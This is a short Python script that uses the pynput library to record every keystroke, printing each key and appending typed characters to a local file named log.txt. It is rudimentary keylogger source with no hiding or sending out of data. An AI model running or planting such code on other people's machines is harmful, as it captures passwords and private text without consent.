from pynput import keyboard

# When a key is pressed, print it to the console, and open a new text file.
# If the key cannot be logged, then print "Error getting char"
def keyPressed(key):
    print(str(key))
    with open("log.txt", 'a') as logKey:
        try: 
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

# Starts the listening process of the inputted characters
if __name__ == "__main__":
        listener = keyboard.Listener(on_press=keyPressed)
        listener.start()
        input()